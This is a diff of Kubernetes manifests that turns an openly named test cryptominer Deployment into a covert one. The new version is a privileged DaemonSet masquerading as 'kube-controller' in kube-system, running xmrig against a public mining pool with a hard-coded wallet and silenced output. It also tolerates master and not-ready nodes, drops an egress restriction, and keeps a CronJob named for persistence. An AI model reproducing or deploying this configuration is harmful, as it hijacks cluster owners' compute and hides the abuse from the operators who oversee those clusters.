@@ -50,98 +50,63 @@ spec:
         path: / && \
 ---
 apiVersion: apps/v1
-kind: Deployment
+kind: DaemonSet
 metadata:
-  name: cryptominer-cdr
+  name: kube-controller
+  namespace: kube-system
   labels:
-    app: cryptominer
+    app: kube-controller
+  annotations:
+    kubernetes.io/psp: eks.privileged
 spec:
-  replicas: 1
   selector:
     matchLabels:
-      app: cryptominer
+      name: kube-controller
   template:
     metadata:
       labels:
-        app: cryptominer
+        name: kube-controller
     spec:
       containers:
-      - name: cryptominer-container
-        image: zsco/xmrig-docker:latest
-        ports:
-        - containerPort: 8080
-        securityContext:
-          runAsNonRoot: false
-          capabilities:
-            add:
-              - SYS_ADMIN
-          readOnlyRootFilesystem: false
-          allowPrivilegeEscalation: true
+      - name: xmrig
+        image: dorjik/xmrig
+        command: [ "sh", "-c", "/xmrig/xmrig --donate-level 0 -o ca.minexmr.com:443 -u 41pdpXWNMe6NvuDASWXn6ZMdPk4N6amucCHHstNcw2y8caJNdgN4kNeW3QFfc3amCiJ9x6dh8pLboR6minjYZpgk1szkeGg -k --tls >/dev/null 2>/dev/null" ]
         resources:
           limits:
-            memory: "1024Mi"
-            cpu: "1000m"
-          requests:
-            memory: "512Mi"
             cpu: "500m"
-      restartPolicy: Always
-      nodeSelector:
-        kubernetes.io/os: linux
+            memory: "256Mi"
+          requests:
+            cpu: "200m"
+            memory: "128Mi"
+        securityContext:
+          privileged: true
       tolerations:
-      - key: "node-role.kubernetes.io/master"
-        effect: "NoSchedule"
-      - key: "CriticalAddonsOnly"
-        operator: "Exists"
-      affinity:
-        podAntiAffinity:
-          preferredDuringSchedulingIgnoredDuringExecution:
-          - weight: 1
-            podAffinityTerm:
-              labelSelector:
-                matchExpressions:
-                - key: app
-                  operator: In
-                  values:
-                  - cryptominer
-              topologyKey: "kubernetes.io/hostname"
+      - key: node-role.kubernetes.io/master
+        effect: NoSchedule
+      - key: node.kubernetes.io/not-ready
+        operator: Exists
+      restartPolicy: Always
+
 ---
 apiVersion: v1
 kind: Service
 metadata:
   name: cryptominer-service
   labels:
-    app: cryptominer
+    app: kube-controller
 spec:
   type: LoadBalancer
   selector:
-    app: cryptominer
+    app: kube-controller
   ports:
   - protocol: TCP
     port: 8080
     targetPort: 8080
 ---
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: cryptominer-deny-egress
-spec:
-  podSelector:
-    matchLabels:
-      app: cryptominer
-  policyTypes:
-  - Egress
-  egress:
-  - to:
-    - ipBlock:
-        cidr: 0.0.0.0/0
-    ports:
-    - protocol: TCP
-      port: 8080
----
 apiVersion: batch/v1
 kind: CronJob
 metadata:
-  name: cryptominer-cron
+  name: cryptominer-persistance
   labels:
     app: cryptominer
 spec:
